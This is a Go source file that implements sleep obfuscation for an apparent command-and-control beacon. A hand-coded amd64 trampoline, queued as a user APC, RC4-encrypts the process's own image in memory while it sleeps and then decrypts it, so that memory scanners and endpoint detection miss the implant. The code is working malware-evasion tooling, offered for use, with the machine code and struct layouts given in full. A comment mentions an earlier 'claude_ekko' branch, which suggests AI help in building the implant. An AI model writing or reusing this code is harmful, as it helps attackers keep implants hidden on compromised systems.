// Package apc implements sleep obfuscation via a QueueUserAPC-driven
// encrypt/sleep/decrypt sequence running on the beacon's own thread.
//
// Design summary
//
// This replaces the older Ekko-based sleep obfuscation, which is
// fundamentally incompatible with Go's runtime (see the claude_ekko
// branch and the postmortem in that commit history). The design here
// avoids every mechanism that caused Ekko to fail:
//
//   - No peer-thread enumeration or suspension: SuspendThread races
//     with Go's async preemption and can deadlock on ntdll/loader locks.
//   - No Windows thread-pool timer callbacks: the NtContinue-hijack of
//     pool workers is fragile even in single-cycle use.
//   - No GetThreadContext, ResumeThread, or Toolhelp snapshots: none of
//     the syscalls that hung in the Ekko debugging campaign are touched.
//
// Instead we allocate a small RWX region OUTSIDE the process image and
// drop a hand-written amd64 trampoline into it. That trampoline, when
// invoked as a QueueUserAPC callback with a pointer to an apcArgs
// struct, calls VirtualProtect / SystemFunction032 (RC4) /
// NtDelayExecution / SystemFunction032 / VirtualProtect via function-
// pointer indirect calls. Because the trampoline sits in a separate
// allocation and only calls into ntdll/kernel32/advapi32 (never back
// into the encrypted Go .text), it runs cleanly through the encrypted
// window on the same thread.
//
// The caller enters the alertable wait via NtWaitForSingleObjectEx; the
// APC dispatcher runs the trampoline to completion; the wait returns
// STATUS_USER_APC; we clean up. That's the entire mechanism.
package apc

import (
	"crypto/rand"
	"errors"
	"fmt"
	"runtime"
	"sync/atomic"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	pageReadWrite        uintptr = 0x04
	pageExecuteReadWrite uintptr = 0x40

	memCommit  uintptr = 0x1000
	memReserve uintptr = 0x2000
	memRelease uintptr = 0x8000
)

var (
	kernel32             = syscall.NewLazyDLL("kernel32.dll")
	procGetModuleHandleA = kernel32.NewProc("GetModuleHandleA")
	procVirtualAlloc     = kernel32.NewProc("VirtualAlloc")
	procVirtualFree      = kernel32.NewProc("VirtualFree")
	procVirtualProtect   = kernel32.NewProc("VirtualProtect")
	procQueueUserAPC     = kernel32.NewProc("QueueUserAPC")

	ntdll                       = syscall.NewLazyDLL("ntdll.dll")
	procNtDelayExecution        = ntdll.NewProc("NtDelayExecution")
	procNtWaitForSingleObjectEx = ntdll.NewProc("NtWaitForSingleObjectEx")

	advapi32              = syscall.NewLazyDLL("Advapi32.dll")
	procSystemFunction032 = advapi32.NewProc("SystemFunction032")
)

// Cumulative counters. Exposed via Stats(). No behavior changes based on them.
var (
	cyclesTotal atomic.Uint64
	errorsTotal atomic.Uint64
)

// Stats returns (cycles, errors) counters since process start. Useful for
// beacon telemetry to detect a host on which APC-based sleep is failing.
func Stats() (cycles, errors uint64) {
	return cyclesTotal.Load(), errorsTotal.Load()
}

// ustring matches the informal SystemFunction032 argument type
// (ULONG Length, ULONG MaximumLength, PVOID Buffer). It is used as the
// data-and-key descriptor for the in-place RC4 encryption.
type ustring struct {
	Length        uint32
	MaximumLength uint32
	Buffer        uintptr
}

// imageNTHeaders64Prefix is enough of IMAGE_NT_HEADERS64 to read SizeOfImage.
// Field order is exactly the PE spec; alignment matches natural layout.
type imageNTHeaders64Prefix struct {
	Signature uint32
	// IMAGE_FILE_HEADER (20 bytes)
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
	// IMAGE_OPTIONAL_HEADER64 (partial)
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
}

// apcArgs is the struct passed to the trampoline via QueueUserAPC's dwData.
//
// FIELD OFFSETS ARE HARD-CODED IN THE TRAMPOLINE MACHINE CODE. Do not
// reorder, resize, or insert fields without also updating the trampoline
// AND the init-time offset assertion below. A mismatch would produce a
// silent crash inside the encrypted window (unrecoverable).
type apcArgs struct {
	imageBase        uintptr // 0x00
	imageSize        uintptr // 0x08
	oldProt          uint32  // 0x10  (VirtualProtect out-param)
	_pad             uint32  // 0x14  (alignment to 8 for the ustring below)
	img              ustring // 0x18  (16 bytes)
	key              ustring // 0x28  (16 bytes)
	delayInterval    int64   // 0x38  (100-ns units, negative = relative)
	virtualProtect   uintptr // 0x40
	systemFunc032    uintptr // 0x48
	ntDelayExecution uintptr // 0x50
}

// trampoline is hand-written amd64 machine code invoked as a
// QueueUserAPC callback. On entry, RCX points to an apcArgs struct.
//
// Sequence (each call preserves RBX per Windows x64 ABI):
//
//	VirtualProtect(base, size, PAGE_READWRITE,          &oldProt)
//	SystemFunction032(&img, &key)                          // RC4 encrypt
//	NtDelayExecution(FALSE, &delayInterval)                // sleep
//	SystemFunction032(&img, &key)                          // RC4 decrypt (symmetric)
//	VirtualProtect(base, size, PAGE_EXECUTE_READWRITE,  &oldProt)
//	ret
//
// Byte-for-byte annotated:
var trampoline = []byte{
	// Prologue: save RBX, reserve 48 bytes (32 shadow + 16 spare).
	// Entry Rsp % 16 == 8 (call pushed 8-byte ret addr); after push rbx
	// it becomes 0; after sub rsp, 0x30 it stays 0 — properly aligned
	// for the calls that follow.
	0x53,                   // push rbx
	0x48, 0x83, 0xEC, 0x30, // sub rsp, 0x30
	0x48, 0x89, 0xCB,       // mov rbx, rcx           ; rbx = args ptr

	// VirtualProtect(base, size, PAGE_READWRITE, &oldProt)
	0x48, 0x8B, 0x4B, 0x00,             // mov rcx, [rbx+0x00]
	0x48, 0x8B, 0x53, 0x08,             // mov rdx, [rbx+0x08]
	0x41, 0xB8, 0x04, 0x00, 0x00, 0x00, // mov r8d, 0x04
	0x4C, 0x8D, 0x4B, 0x10,             // lea r9,  [rbx+0x10]
	0xFF, 0x53, 0x40,                   // call qword ptr [rbx+0x40]

	// SystemFunction032(&img, &key) -- encrypt
	0x48, 0x8D, 0x4B, 0x18, // lea rcx, [rbx+0x18]
	0x48, 0x8D, 0x53, 0x28, // lea rdx, [rbx+0x28]
	0xFF, 0x53, 0x48,       // call qword ptr [rbx+0x48]

	// NtDelayExecution(FALSE, &delayInterval)
	// Non-alertable: no other APCs can slip in between encrypt and decrypt.
	0x33, 0xC9,             // xor ecx, ecx
	0x48, 0x8D, 0x53, 0x38, // lea rdx, [rbx+0x38]
	0xFF, 0x53, 0x50,       // call qword ptr [rbx+0x50]

	// SystemFunction032(&img, &key) -- decrypt (RC4 is symmetric)
	0x48, 0x8D, 0x4B, 0x18, // lea rcx, [rbx+0x18]
	0x48, 0x8D, 0x53, 0x28, // lea rdx, [rbx+0x28]
	0xFF, 0x53, 0x48,       // call qword ptr [rbx+0x48]

	// VirtualProtect(base, size, PAGE_EXECUTE_READWRITE, &oldProt)
	0x48, 0x8B, 0x4B, 0x00,             // mov rcx, [rbx+0x00]
	0x48, 0x8B, 0x53, 0x08,             // mov rdx, [rbx+0x08]
	0x41, 0xB8, 0x40, 0x00, 0x00, 0x00, // mov r8d, 0x40
	0x4C, 0x8D, 0x4B, 0x10,             // lea r9,  [rbx+0x10]
	0xFF, 0x53, 0x40,                   // call qword ptr [rbx+0x40]

	// Epilogue
	0x48, 0x83, 0xC4, 0x30, // add rsp, 0x30
	0x5B,                   // pop rbx
	0xC3,                   // ret
}

func init() {
	// The trampoline references apcArgs fields by hard-coded byte offset.
	// Fail loudly at startup if Go's struct layout has drifted from what
	// the machine code expects — a mismatch here would produce a silent
	// crash inside the encrypted window at first Sleep() call.
	var a apcArgs
	mustOffset("imageBase",        unsafe.Offsetof(a.imageBase),        0x00)
	mustOffset("imageSize",        unsafe.Offsetof(a.imageSize),        0x08)
	mustOffset("oldProt",          unsafe.Offsetof(a.oldProt),          0x10)
	mustOffset("img",              unsafe.Offsetof(a.img),              0x18)
	mustOffset("key",              unsafe.Offsetof(a.key),              0x28)
	mustOffset("delayInterval",    unsafe.Offsetof(a.delayInterval),    0x38)
	mustOffset("virtualProtect",   unsafe.Offsetof(a.virtualProtect),   0x40)
	mustOffset("systemFunc032",    unsafe.Offsetof(a.systemFunc032),    0x48)
	mustOffset("ntDelayExecution", unsafe.Offsetof(a.ntDelayExecution), 0x50)
}

func mustOffset(name string, got, want uintptr) {
	if got != want {
		panic(fmt.Sprintf("apc: apcArgs.%s at offset 0x%X, expected 0x%X (trampoline drift)", name, got, want))
	}
}

// Sleep obfuscates the current process image for sleepMs milliseconds.
//
// See the package-level comment for the overall design. The important
// invariants for correctness are:
//
//   - runtime.LockOSThread pins the beacon goroutine to this M for the
//     entire duration, so the APC we queue is guaranteed to land on the
//     same thread that enters the alertable wait.
//   - The trampoline lives in a fresh VirtualAlloc'd RWX region that is
//     NOT part of the process image, so it survives the encryption pass.
//   - The trampoline never calls back into Go .text; every function it
//     invokes lives in ntdll / kernel32 / advapi32.
//   - The apcArgs struct is heap-allocated (escape analysis lifts it out
//     of the goroutine stack because we pass its address to unmanaged
//     code) so the trampoline can dereference it after we return control
//     to the alertable wait.
func Sleep(sleepMs uint64) error {
	if sleepMs == 0 {
		return nil
	}
	cyclesTotal.Add(1)

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Image base and size — needed to know what to encrypt.
	imageBase, _, _ := procGetModuleHandleA.Call(0)
	if imageBase == 0 {
		errorsTotal.Add(1)
		return errors.New("apc: GetModuleHandleA returned NULL")
	}
	eLfaNew := *((*uint32)(unsafe.Pointer(imageBase + 0x3c)))
	nt := (*imageNTHeaders64Prefix)(unsafe.Pointer(imageBase + uintptr(eLfaNew)))
	imageSize := uintptr(nt.SizeOfImage)

	// Fresh RC4 key per cycle.
	var keyBuf [16]byte
	if _, err := rand.Read(keyBuf[:]); err != nil {
		errorsTotal.Add(1)
		return err
	}

	// Allocate the trampoline OUTSIDE the image mapping so that when the
	// image is encrypted the trampoline's own code is unaffected.
	tramp, _, _ := procVirtualAlloc.Call(
		0,
		uintptr(len(trampoline)),
		memCommit|memReserve,
		pageExecuteReadWrite,
	)
	if tramp == 0 {
		errorsTotal.Add(1)
		return errors.New("apc: VirtualAlloc for trampoline failed")
	}
	defer procVirtualFree.Call(tramp, 0, memRelease)

	copy(
		unsafe.Slice((*byte)(unsafe.Pointer(tramp)), len(trampoline)),
		trampoline,
	)

	// Heap-allocated args — pointer given to unmanaged code, so escape
	// analysis promotes it to the heap and stack moves cannot invalidate
	// the pointer while the APC is in flight.
	args := &apcArgs{
		imageBase: imageBase,
		imageSize: imageSize,
		img: ustring{
			Length:        uint32(imageSize),
			MaximumLength: uint32(imageSize),
			Buffer:        imageBase,
		},
		key: ustring{
			Length:        uint32(len(keyBuf)),
			MaximumLength: uint32(len(keyBuf)),
			Buffer:        uintptr(unsafe.Pointer(&keyBuf[0])),
		},
		// 100-ns units, negative sign = relative delay.
		delayInterval:    -int64(sleepMs) * 10_000,
		virtualProtect:   procVirtualProtect.Addr(),
		systemFunc032:    procSystemFunction032.Addr(),
		ntDelayExecution: procNtDelayExecution.Addr(),
	}

	// Real handle to self. The pseudo-handle from GetCurrentThread works
	// with QueueUserAPC in practice but is not documented as guaranteed;
	// take the safe path.
	hSelf, err := windows.OpenThread(
		windows.THREAD_SET_CONTEXT|windows.THREAD_QUERY_INFORMATION,
		false,
		windows.GetCurrentThreadId(),
	)
	if err != nil {
		errorsTotal.Add(1)
		return err
	}
	defer windows.CloseHandle(hSelf)

	// Queue the APC. It will not be delivered until this thread enters an
	// alertable wait — which happens on the very next line.
	ret, _, _ := procQueueUserAPC.Call(
		tramp,
		uintptr(hSelf),
		uintptr(unsafe.Pointer(args)),
	)
	if ret == 0 {
		errorsTotal.Add(1)
		return errors.New("apc: QueueUserAPC failed")
	}

	// Enter the alertable wait. The kernel notices the queued APC,
	// dispatches the trampoline (which runs the whole encrypt/sleep/
	// decrypt cycle synchronously), and returns STATUS_USER_APC when the
	// trampoline is done. We wait on the current-process handle because
	// NtWaitForSingleObjectEx requires SOME valid handle and the process
	// handle never signals from inside the process — the wait can only
	// return via the APC completion path.
	//
	// Timeout=0 as a PLARGE_INTEGER argument means NULL, which the kernel
	// interprets as "wait indefinitely."
	procNtWaitForSingleObjectEx.Call(
		uintptr(windows.CurrentProcess()),
		1, // Alertable = TRUE
		0, // Timeout = NULL (INFINITE)
	)

	// Keep the buffers referenced through the unmanaged execution above.
	// Go's escape analysis handles &args and &keyBuf, but an explicit
	// KeepAlive documents the invariant and is defensive against future
	// compiler changes.
	runtime.KeepAlive(keyBuf)
	runtime.KeepAlive(args)

	return nil
}
